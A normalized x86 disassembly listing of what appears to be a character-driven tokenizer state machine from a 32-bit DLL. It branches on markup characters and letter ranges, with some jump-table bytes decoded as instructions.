mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10079470
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100795c0
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_1007a2a0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
push esi
cmp eax 0x21
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push edi
mov [ edx ] 0x2c
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x94 ]
push eax
call sub_1004dec0
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_1004af10
push ebx
push esi
call sub_10006330
add edi 0x20
push edi
push esi
call sub_1004af10
push edi
push esi
call sub_10006330
add esp 0x24
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x2f
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov [ edx ] 0x8
mov ecx [ eax + 0x8 ]
add ecx 0x10
push ecx
push 0x2f
push eax
call sub_1004c3a0
add esp 0xc
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x3f
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2b
call sub_100793b0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x3f
push esi
call sub_1004c3a0
push 0x8
mov eax esi
call sub_10079230
add esp 0x10
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x41
jl r-xdata
add eax 0xffffff9f
cmp eax 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov ebx [ ebp + 0x8 ]
push 0xa
mov eax ebx
call sub_10079230
mov edx [ ebp + 0x14 ]
mov ecx [ ebx + 0x8 ]
push edx
mov [ ecx ] 0x0
call sub_10079960
add esp 0x8
pop esi
xor eax eax
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
push 0x1
mov [ eax ] 0x9
call sub_100799d0
add esp 0x4
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_1007a3c0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0xffffffff
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push 0xc
mov eax ebx
call sub_10079230
mov eax [ ebp + 0x14 ]
mov edx [ ebx + 0x8 ]
push eax
mov [ edx ] 0x0
call sub_10079960
add esp 0x8
pop ebx
pop edi
pop ebp
retn
push esi
cmp edi 0x3e
je r-xdata
mov esi [ ebp + 0x8 ]
push 0xb
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
add esp 0x4
pop esi
mov [ ecx ] 0x0
mov eax 0x2
pop edi
pop ebp
retn
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
push 0xd
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2b
call sub_100793b0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push edi
push esi
call sub_1004c3a0
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x9
call sub_100799d0
add esp 0x4
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_1007a490
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
lea ecx [ eax + 0x1 ]
push esi
push edi
cmp ecx 0x3f
ja r-xdata
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_1007a5fc ]
jmp [ ecx * 4 + jump_table_1007a5e4 ]
mov edx [ ebp + 0x8 ]
mov esi [ edx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
add eax 0x20
mov esi [ ebp + 0x8 ]
call sub_10079a70
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
call sub_10079a70
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
call sub_10079a70
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ ecx ] 0x0
call sub_100796f0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_10079230
mov esi [ edi + 0x8 ]
mov edx [ r--data ]
lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] edx
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x9
mov eax ebx
call sub_10079230
add esp 0x4
call sub_10079830
mov eax [ ebx + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x0
mov eax 0x2
pop ebx
pop ebp
retn
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push edi
push ecx
push edx
call sub_1004c3a0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea eax [ esi + 0x50 ]
push eax
lea ebx [ esi + 0x94 ]
push ebx
call sub_1006c7a0
push ebx
call sub_1003fa70
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebp + 0x10 ]
push ebx
push edx
push edi
call sub_1004c3a0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push ecx
push eax
call sub_1006c7a0
lea eax [ esi + 0x94 ]
push eax
call sub_1003fa70
add esp 0xc
mov [ esi + 0x48 ] eax
sub_1007a602
add eax 0x2050505
add al [ 0x5050502 ]
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050502
add eax 0x5050505
add eax 0x5050505
add eax 0x5050503
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_1007a640
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x2
push edx
mov [ ecx + 0x4 ] 0x1
call sub_10079960
add esp 0x4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0xb
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop ebp
retn
sub_1007a6a0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x2
call sub_10079960
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0xc
call sub_100799d0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1004c3a0
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_1007a710
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_1004c3a0
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x2
call sub_10079830
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10079960
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10031030
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_1004c3a0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_1004c3a0
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_1006c7a0
lea eax [ edi + 0x94 ]
push eax
call sub_1003fa70
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_1007a870 ]
jmp [ edx * 4 + jump_table_1007a860 ]
call sub_10079a70
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a70
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a70
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_100796f0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1007a874
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007a8b0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x4
push edx
mov [ ecx + 0x4 ] 0x1
call sub_10079960
add esp 0x4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0xe
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop ebp
retn
sub_1007a910
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x4
call sub_10079960
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0xf
call sub_100799d0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1004c3a0
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_1007a980
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x3c ]
mov edx [ eax + 0x40 ]
push ebx
push esi
push edi
push ecx
push edx
push r--data
call sub_10020200
mov ebx [ ebp + 0x10 ]
add esp 0xc
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_1004c3a0
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x4
call sub_10079830
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10079960
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10031030
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0xc ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0xc ] edx
jmp r-xdata
push r--data
call sub_10020200
lea eax [ ebx - 0x9 ]
add esp 0x4
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0xc ]
push eax
push edx
push esi
call sub_1004c3a0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_1004c3a0
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_1006c7a0
lea eax [ edi + 0x94 ]
push eax
call sub_1003fa70
mov [ edi + 0x48 ] eax
mov eax [ ebp + 0x10 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_1007aafc ]
jmp [ edx * 4 + jump_table_1007aaec ]
call sub_10079a70
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
call sub_10079a70
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
call sub_10079a70
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_100796f0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1007ab00
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007ab40
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0x2f
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp eax 0x21
mov eax [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x11
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop ebp
retn
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
push edx
mov [ ecx + 0x4 ] 0x1
call sub_10079960
add esp 0x4
pop ebx
pop ebp
retn
mov [ eax ] 0x13
mov ecx [ ebx + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push ebx
call sub_1004c3a0
mov edx [ ebp + 0x14 ]
push edx
call sub_10079960
add esp 0x10
pop ebx
pop ebp
retn
sub_1007abc0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x5
call sub_10079960
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x12
call sub_100799d0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1004c3a0
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_1007ac30
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_1004c3a0
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x5
call sub_10079830
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10079960
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10031030
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_1004c3a0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_1004c3a0
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_1006c7a0
lea eax [ edi + 0x94 ]
push eax
call sub_1003fa70
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_1007ad90 ]
jmp [ edx * 4 + jump_table_1007ad80 ]
call sub_10079a70
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a70
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a70
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_100796f0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1007ad94
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007add0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2d
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x14
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007ae30
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2d
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x17
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007ae90
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_1007af80 ]
jmp [ eax * 4 + jump_table_1007af6c ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x16
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x18
call sub_100793b0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_1004c3a0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100795c0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10079230
mov edi [ ebp + 0x14 ]
add esp 0x4
mov eax esi
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10079470
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007af85
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007afc0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x15
movzx eax [ eax + lookup_table_1007b0b4 ]
jmp [ eax * 4 + jump_table_1007b0a0 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x17
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x18
call sub_100793b0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_1004c3a0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push 0x2
mov eax esi
mov [ edx ] 0x15
call sub_10079230
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100795c0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007b0b9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007b100
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x15
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
movzx eax [ eax + lookup_table_1007b210 ]
jmp [ eax * 4 + jump_table_1007b1f8 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov [ edx ] 0x18
call sub_100793b0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push edi
push esi
call sub_1004c3a0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x5
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x15
push 0x2
mov eax esi
call sub_10079230
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100795c0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007b216
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add al [ 0x5050505 ]
add eax 0x5050505
add eax 0x3050505
add eax 0xec8b5504
push esi
mov esi [ ebp + 0x10 ]
cmp esi 0x2f
jne r-xdata
push ebx
cmp esi 0x41
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x19
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push esi
push eax
call sub_1004c3a0
add esp 0xc
lea eax [ esi - 0x2d ]
pop esi
pop ebp
retn
lea eax [ esi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp esi 0x5a
jle r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x15
call sub_10079960
add esp 0x4
pop ebx
pop esi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov [ ecx ] 0x1b
mov edx [ ebx + 0x8 ]
add edx 0x10
push edx
push esi
push ebx
call sub_1004c3a0
lea eax [ esi - 0x41 ]
add esp 0xc
cmp eax 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
add ecx 0x20
push ecx
push esi
push ebx
call sub_1004c3a0
mov edx [ ebp + 0x14 ]
push edx
call sub_10079960
add esp 0x10
pop ebx
pop esi
pop ebp
retn
add esi 0x20
sub_1007b300
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x15
call sub_10079960
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x1a
call sub_100799d0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1004c3a0
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_1007b370
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
